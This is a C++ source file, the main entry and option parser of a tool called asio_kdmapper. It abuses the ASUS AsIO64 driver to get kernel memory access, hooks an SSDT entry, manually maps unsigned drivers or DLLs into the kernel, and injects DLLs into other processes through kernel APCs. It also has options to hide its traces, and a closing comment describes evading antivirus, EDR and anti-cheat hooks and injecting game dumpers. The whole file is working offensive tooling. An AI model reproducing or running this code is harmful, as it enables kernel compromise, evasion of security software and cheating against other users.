                } else {
                    options.TargetProcessName = v;
                }
                options.Mode = RunMode::RemoteProcessDll;
                options.Mapper.IsDllImage = false;  // R3 inject doesn't use the R0 DllMain path
            } else if (arg == L"--get-export") {
                options.DllExportName = NarrowAscii(requireValue(L"--get-export"));
            } else if (arg == L"--dump-exe") {
                options.DumpExePath = requireValue(L"--dump-exe");
                // --dump-exe needs --target. Auto-set the mode here; if
                // --inject-dll wasn't given, TargetPath stays empty and
                // we'll skip the inject step but still run the dump.
                if (options.Mode != RunMode::RemoteProcessDll) {
                    options.Mode = RunMode::RemoteProcessDll;
                }
            } else if (arg == L"--asio") {
                options.AsioPath = requireValue(L"--asio");
            } else if (arg == L"--service") {
                options.ServiceName = requireValue(L"--service");
            } else if (arg == L"--keep-asio") {
                options.KeepAsio = true;
            } else if (arg == L"--free") {
                options.Mapper.FreeAfterEntry = true;
            } else if (arg == L"--copy-header") {
                options.Mapper.DestroyHeader = false;
            } else if (arg == L"--pass-allocation-ptr") {
                options.Mapper.PassAllocationPtr = true;
            } else if (arg == L"--param1") {
                options.Mapper.Param1 = ParseInteger(requireValue(L"--param1"));
            } else if (arg == L"--param2") {
                options.Mapper.Param2 = ParseInteger(requireValue(L"--param2"));
            } else if (arg == L"--randomize-service") {
                options.RandomizeService = true;
            } else if (arg == L"--copy-driver-to-temp") {
                options.CopyDrvToTemp = true;
            } else if (arg == L"--sweep-registry") {
                options.SweepRegistry = true;
            } else if (arg == L"--clean-init") {
                options.CleanInit = true;
            } else if (arg == L"--persist") {
                options.PersistDriver = true;
                options.Mapper.PersistDriver = true;
            } else if (arg == L"--scrub-headers") {
                options.ScrubHeaders = true;
            } else if (arg == L"--server") {
                options.ServerMode = true;
            } else if (arg == L"--pipe-name") {
                options.PipeName = NarrowPipeName(requireValue(L"--pipe-name"));
            } else if (!arg.empty() && arg[0] == L'-') {
                std::wcerr << L"[-] Unknown option: " << arg << std::endl;
                return false;
            } else if (options.TargetPath.empty()) {
                options.TargetPath = arg;
            } else {
                std::wcerr << L"[-] Unexpected extra argument: " << arg << std::endl;
                return false;
            }
        } catch (const std::exception&) {
            return false;
        }
    }

    // TargetPath (driver .sys / DLL path) is required for every mode that
    // mappers a PE. The exception is "dump-only" — when the user passed
    // --dump-exe + --target without an --inject-dll, we have a target but
    // no image to map. That's a legitimate invocation. --server also runs
    // without any TargetPath: it just exposes R0 primitives over a pipe.
    const bool dumpOnly = options.Mode == RunMode::RemoteProcessDll && !options.DumpExePath.empty() && options.TargetPath.empty();
    if (options.TargetPath.empty() && !dumpOnly && !options.ServerMode) {
        PrintUsage();
        return false;
    }

    if (options.Mode == RunMode::RemoteProcessDll && !options.TargetPid && options.TargetProcessName.empty()) {
        std::wcerr << L"[-] --target requires a PID or process name" << std::endl;
        return false;
    }

    if (!options.DllExportName.empty() && options.Mode != RunMode::KernelDll) {
        std::wcerr << L"[-] --get-export only makes sense with --inject-dll (R0 manual-map)" << std::endl;
        return false;
    }

    return true;
}

} // namespace asio

int wmain(int argc, wchar_t** argv) {
    asio::CliOptions options{};
    if (!asio::ParseCommandLine(argc, argv, options)) {
        return 1;
    }
    if (options.ShowHelp) {
        asio::PrintUsage();
        return 0;
    }

    std::vector<uint8_t> targetImage;
    std::wstring targetPath;
    if (!options.TargetPath.empty()) {
        targetPath = asio::FullPath(options.TargetPath);
        if (!asio::ReadFileBytes(targetPath, targetImage)) {
            return 1;
        }
    }

    // DLL mode sanity-check: target must actually be marked as a DLL. We can
    // still manual-map executables, but DllMain isn't the right convention.
    // Skip in dump-only mode (no TargetPath / targetImage).
    if (!targetImage.empty() &&
        (options.Mode == asio::RunMode::KernelDll ||
         options.Mode == asio::RunMode::RemoteProcessDll)) {
        auto* rawBase = const_cast<uint8_t*>(targetImage.data());
        PIMAGE_NT_HEADERS64 nt = asio::GetNtHeaders(rawBase);
        if (!nt || (nt->FileHeader.Characteristics & IMAGE_FILE_DLL) == 0) {
            std::wcerr << L"[-] --inject-dll requires a PE marked as a DLL" << std::endl;
            return 1;
        }
    }
    switch (options.Mode) {
    case asio::RunMode::KernelDll:
        std::wcout << L"[*] Mode: R0 DLL manual-map (DllMain in kernel context)" << std::endl;
        break;
    case asio::RunMode::RemoteProcessDll:
        std::wcout << L"[*] Mode: R3 cross-process inject + R0 APC trigger" << std::endl;
        break;
    default:
        std::wcout << L"[*] Mode: R0 driver manual-map (DriverEntry in kernel context)" << std::endl;
        break;
    }

    // Resolve target PID up-front for cross-process mode so we fail fast if
    // the named process isn't running.
    DWORD remotePid = 0;
    if (options.Mode == asio::RunMode::RemoteProcessDll) {
        remotePid = options.TargetPid;
        if (!remotePid && !options.TargetProcessName.empty()) {
            remotePid = asio::FindProcessIdByName(options.TargetProcessName);
            if (!remotePid) {
                std::wcerr << L"[-] Could not find target process: " << options.TargetProcessName << std::endl;
                return 1;
            }
        }
        if (!remotePid) {
            std::wcerr << L"[-] --target requires a PID or process name" << std::endl;
            return 1;
        }
        std::wcout << L"[+] Target PID: " << remotePid << std::endl;
    }

    asio::AsioProvider provider;
    bool loadedAsio = false;
    bool createdService = false;

    if (!provider.Open()) {
        if (options.AsioPath.empty()) {
            options.AsioPath = asio::FindDefaultAsioPath();
        }

        if (options.AsioPath.empty()) {
            std::wcerr << L"[-] Could not open \\\\.\\Asusgio and no AsIO64 path was found. Use --asio <path>." << std::endl;
            return 1;
        }

        if (options.RandomizeService) {
            options.ServiceName = asio::RandomName(12);
            std::wcout << L"[*] Randomized service name: " << options.ServiceName << std::endl;
        }
        if (options.CopyDrvToTemp) {
            const std::wstring tempPath = asio::CopyDriverToTemp(options.AsioPath);
            if (!tempPath.empty()) {
                std::wcout << L"[*] Copied driver to temp: " << tempPath << std::endl;
                options.AsioPath = tempPath;
            }
        }

        std::wcout << L"[*] Loading AsIO64 service from: " << asio::FullPath(options.AsioPath) << std::endl;
        if (!asio::LoadKernelDriverService(options.AsioPath, options.ServiceName, createdService)) {
            return 1;
        }

        loadedAsio = true;
        if (!provider.Open()) {
            asio::PrintWin32Error(L"CreateFileW(\\\\.\\Asusgio)");
            if (createdService && !options.KeepAsio) {
                asio::StopAndDeleteKernelDriverService(options.ServiceName);
            }
            return 1;
        }
    }

    std::wcout << L"[+] AsIO64 device opened" << std::endl;
    auto cleanup = [&]() {
        provider.Close();
        if (loadedAsio && createdService && !options.KeepAsio) {
            std::wcout << L"[*] Unloading AsIO64 service" << std::endl;
            asio::StopAndDeleteKernelDriverService(options.ServiceName);
            if (options.SweepRegistry) {
                asio::SweepServiceRegistry(options.ServiceName);
            }
            createdService = false;
        }
    };

    uint64_t ntoskrnl = asio::GetKernelModuleAddress("ntoskrnl.exe");
    if (!ntoskrnl) {
        ntoskrnl = asio::GetKernelModuleAddress("");
    }
    if (!ntoskrnl) {
        uint64_t pml4 = 0;
        if (provider.QueryPml4(pml4)) {
            ntoskrnl = asio::ResolveKernelBaseFromAnchor(provider, provider.LowStubAnchor());
            if (ntoskrnl) {
                std::wcout << L"[+] Resolved ntoskrnl base from low-stub anchor: 0x"
                           << std::hex << ntoskrnl << std::dec << std::endl;
            }
        }
    }
    if (!ntoskrnl) {
        std::wcerr << L"[-] Failed to locate ntoskrnl base" << std::endl;
        cleanup();
        return 1;
    }

    provider.SetNtoskrnlBase(ntoskrnl);
    std::wcout << L"[+] ntoskrnl base: 0x" << std::hex << ntoskrnl << std::dec << std::endl;

    uint64_t pml4 = 0;
    if (!provider.QueryPml4(pml4)) {
        cleanup();
        return 1;
    }

    // --server: skip the one-shot driver-map / inject branches and serve
    // R0 read/write requests over a named pipe until SHUTDOWN.
    if (options.ServerMode) {
        const int rc = asio::RunR0Server(provider, options.PipeName);
        cleanup();
        return rc;
    }

    // Cross-process inject path: stage DLL via R3 mem APIs, fire DllMain via
    // a kernel-built APC. The DLL runs in the target's R3 context, so it can
    // use user-mode imports normally (kernel32/user32/file I/O/...). Typical
    // use-case: Dumper-7 / UEDumper style SDK extractors injected into UE
    // games, or hello_dll style PoC into Sublime Text.
    if (options.Mode == asio::RunMode::RemoteProcessDll) {
        // For dump+inject combined runs, snapshot the target FIRST so the
        // dump captures the pristine image (no Dumper-7 mapped in yet).
        if (!options.DumpExePath.empty()) {
            const uint64_t eprocess = asio::ResolveTargetEprocess(provider, remotePid);
            const uint64_t cr3 = eprocess ? asio::ReadTargetCr3(provider, eprocess) : 0;
            if (!eprocess || !cr3) {
                std::wcerr << L"[-] Could not resolve target for dump" << std::endl;
                cleanup();
                return 1;
            }
            if (!asio::DumpTargetMainImage(provider, eprocess, cr3, options.DumpExePath)) {
                std::wcerr << L"[-] Dump failed" << std::endl;
                cleanup();
                return 1;
            }
            if (targetImage.empty()) {
                // Dump-only run — no DLL to inject, we're done.
                cleanup();
                return 0;
            }
        }

        asio::RemoteMappedDll injected{};
        const bool injectedOk = asio::InjectDllRemoteR0Trigger(provider, remotePid,
                                                               targetImage, targetPath, injected);
        if (injectedOk && options.ScrubHeaders) {
            // Best-effort header scrub. We re-resolve EPROCESS/CR3 here rather
            // than threading them out of InjectDllRemoteR0Trigger; the cost
            // is one extra page-walk per scrub and zero coupling changes.
            const uint64_t epr = asio::ResolveTargetEprocess(provider, remotePid);
            const uint64_t cr3 = epr ? asio::ReadTargetCr3(provider, epr) : 0;
            if (cr3) {
                const uint64_t remoteBase = reinterpret_cast<uintptr_t>(injected.RemoteBase);
                if (asio::ScrubInjectedHeaders(provider, cr3, remoteBase, injected.ImageSize)) {
                    std::wcout << L"[+] Scrubbed PE headers at remote base 0x"
                               << std::hex << remoteBase << std::dec << std::endl;
                } else {
                    std::wcerr << L"[!] Header scrub failed (non-fatal)" << std::endl;
                }
            } else {
                std::wcerr << L"[!] Header scrub skipped: could not re-resolve target CR3" << std::endl;
            }
        }
        cleanup();
        if (!injectedOk) {
            return 1;
        }
        std::wcout << L"[+] R3 DLL staged at 0x" << std::hex
                   << reinterpret_cast<uintptr_t>(injected.RemoteBase) << std::dec
                   << L"; DllMain APC queued. Trigger fires when a target thread\n"
                      L"    enters an alertable wait (most processes do so within seconds).\n"
                      L"    Watch the target process for the DLL's side effects.\n";
        return 0;
    }

    NTSTATUS exitCode = STATUS_SUCCESS;
    uint64_t kernelImageBase = 0;
    const uint64_t mappedBase = asio::MapDriver(provider, targetImage, options.Mapper,
                                                options.CleanInit, exitCode, &kernelImageBase);

    // In DLL mode, optionally resolve a named export and invoke it through
    // the same NtAddAtom hook used by CallKernelFunction. The export call
    // uses --param1/--param2 just like DriverEntry parameters.
    NTSTATUS exportStatus = STATUS_SUCCESS;
    bool exportCalled = false;
    if (mappedBase && options.Mode == asio::RunMode::KernelDll && !options.DllExportName.empty()) {
        const DWORD rva = asio::GetExportRvaByName(targetImage, options.DllExportName);
        if (!rva) {
            std::wcerr << L"[-] Export not found (or is a forwarded export, which is not supported): "
                       << std::wstring(options.DllExportName.begin(), options.DllExportName.end())
                       << std::endl;
        } else {
            const uint64_t exportAddr = kernelImageBase + rva;
            std::wcout << L"[+] Calling kernel export "
                       << std::wstring(options.DllExportName.begin(), options.DllExportName.end())
                       << L" @ 0x" << std::hex << exportAddr << std::dec << std::endl;
            if (provider.CallKernelFunction(&exportStatus, exportAddr,
                                            options.Mapper.Param1, options.Mapper.Param2)) {
                exportCalled = true;
                std::wcout << L"[+] Export returned: 0x" << std::hex << exportStatus << std::dec << std::endl;
            } else {
                std::wcerr << L"[-] Export call failed (CallKernelFunction)" << std::endl;
            }
        }
    }

    cleanup();

    if (!mappedBase) {
        return 1;
    }

    if (options.Mode == asio::RunMode::KernelDll) {
        std::wcout << L"[+] R0 DLL mapping completed at 0x" << std::hex << mappedBase
                   << L"; DllMain returned " << (exitCode ? L"TRUE" : L"FALSE")
                   << L" (0x" << exitCode << L")" << std::dec << std::endl;
    } else {
        std::wcout << L"[+] Mapping completed at 0x" << std::hex << mappedBase
                   << L"; DriverEntry status 0x" << exitCode << std::dec << std::endl;
    }

    // Visual confirmation: the entry point + (optionally) the named export
    // both executed in kernel context. Driver mode treats STATUS_SUCCESS as
    // the success signal; DLL mode treats a non-zero BOOL from DllMain as
    // success. Either way, this MessageBox firing proves the SSDT hook
    // landed, the kernel allocation succeeded, the image was relocated and
    // imports resolved, and the entry ran in R0.
    const bool entryOk = options.Mode == asio::RunMode::KernelDll
                             ? (exitCode != 0)
                             : NT_SUCCESS(exitCode);
    if (entryOk) {
        const char* body = options.Mode == asio::RunMode::KernelDll
            ? "Hello from R0!\n\n"
              "The target DLL was manually mapped into kernel non-paged pool\n"
              "and DllMain ran in kernel context, returning TRUE. The legacy\n"
              "R3 CreateRemoteThread path is no longer used."
            : "Hello, world!\n\n"
              "The kernel driver loaded via manual mapping just returned\n"
              "STATUS_SUCCESS from DriverEntry. This MessageBox confirms\n"
              "the SSDT/wrapper hook on Win11 build 26200 worked.";
        const char* title = options.Mode == asio::RunMode::KernelDll
            ? "asio_kdmapper homework — R0 DLL load OK"
            : "asio_kdmapper homework — driver load OK";
        MessageBoxA(nullptr, body, title, MB_OK | MB_ICONINFORMATION);
    }

    // If the user requested an export call and it succeeded, fold its status
    // into the program exit code as well so scripts can detect failure.
    if (exportCalled && !NT_SUCCESS(exportStatus)) {
        return static_cast<int>(exportStatus);
    }
    return 0;
}
/*
┌───────────────────────────────────────────────────────────────────────┐
│  R0-driven R3 DLL injection — status of each step in this codebase    │
├───────────────────────────────────────────────────────────────────────┤
│  ① AsIO64 物理内存 → 读内核数据结构              [✓ AsioProvider]    │
│     ReadKernelMemory / VirtualToPhysical / QueryPml4 (this file)      │
│                                                                       │
│  ② 找到目标进程 → 拿 EPROCESS                    [✓ R0 lookup]       │
│     ResolveTargetEprocess → CallKernelFunction(PsLookupProcessByPid). │
│     No NtQuerySystemInformation(SystemProcessInfo) from R3.           │
│                                                                       │
│  ③ EPROCESS->DirectoryTableBase → 目标 CR3       [✓ ReadTargetCr3]   │
│                                                                       │
│  ④ 在目标进程上下文中分配 user-mode 虚拟内存     [✓ R0 shellcode]    │
│     AllocateTargetUserMem drops an 82-byte stub in kernel pool that   │
│     calls KeStackAttachProcess + ZwAllocateVirtualMemory(PAGE_EXECUTE │
│     _READWRITE) + KeUnstackDetachProcess. Zw* runs with PreviousMode  │
│     == KernelMode, so hooks that gate on (PreviousMode == UserMode)   │
│     self-skip. No NtAllocateVirtualMemory from R3 / OpenProcess.      │
│                                                                       │
│  ⑤ 用目标 CR3 走 PML4 → 物理内存直写 DLL image   [✓ WriteTargetMem]  │
│     Page-walks PML4→PDPT→PD→PT against target CR3 in pure kernel,    │
│     then dumps each chunk via AsIO64's MAPMEM IOCTL. No               │
│     NtWriteVirtualMemory / MmCopyVirtualMemory anywhere.              │
│                                                                       │
│  ⑥ Section 权限                                  [✓ allocate RWX]    │
│     ZwAllocateVirtualMemory returns RWX, so no NtProtectVirtual-      │
│     Memory follow-up is needed. Detection via polling scanners is     │
│     out of scope for "avoid R0 hook" but easy to address later by     │
│     PTE-flipping U/S + NX bits via WritePhysical.                     │
│                                                                       │
│  ⑦ 构造内核 KAPC → 插入目标线程 APC 队列        [✓ R0 APC]          │
│     TriggerDllMainViaR0Apc + KapcLayout + KeInsertQueueApc via the    │
│     NtAddAtom SSDT hook (CallKernelFunction). No CreateRemoteThread,  │
│     no NtQueueApcThread, no NtCreateThreadEx from user mode.          │
└───────────────────────────────────────────────────────────────────────┘

Where each R3 syscall used to live, and what replaced it:

  legacy R3 call         → replacement (R0, via AsIO64 + SSDT hook)
  ─────────────────────────────────────────────────────────────────
  OpenProcess            → ResolveTargetEprocess (PsLookupProcessByPid)
  IsWow64Process         → (dropped; user is responsible for arch match)
  VirtualAllocEx         → AllocateTargetUserMem (R0 shellcode)
  WriteProcessMemory     → WriteTargetMem (target CR3 → physical → AsIO64)
  ReadProcessMemory      → ReadTargetMem  (same direction)
  EnumProcessModulesEx   → ResolveTargetModuleBase (PEB->Ldr walk)
  VirtualProtectEx       → (dropped; allocation is RWX up front)
  CreateRemoteThread     → TriggerDllMainViaR0Apc (KeInsertQueueApc)
  NtQueueApcThread       → same as above

Usage (Win11 24H2+, x64, requires admin to load AsIO64):

  Driver homework (existing path):
      asio_kdmapper.exe path\to\driver.sys
  R0 manual-map a DLL (DllMain in kernel, kernel-API imports only):
      asio_kdmapper.exe --inject-dll path\to\kernel_dll.dll
  Pure-R0 inject into R3 process (Dumper-7 / UEDumper / hello_dll):
      asio_kdmapper.exe --inject-dll path\to\hello_dll.dll --target sublime_text.exe
      asio_kdmapper.exe --inject-dll path\to\Dumper-7.dll  --target <ue_game>.exe

Threat model: R3 ntdll / kernel32 hooks (流氓软件 / AV / EDR R3 stubs) and
the most common R0 hooks that gate on PreviousMode == UserMode (Vanguard-
style object-filter callbacks and Nt* inline hooks). Detection paths that
remain open: VAD polling, code-integrity scans, PatchGuard self-checks on
the NtAddAtom SSDT entry, RWX VAD entries in the target. Those are
polling-based and orthogonal to this implementation.
*/
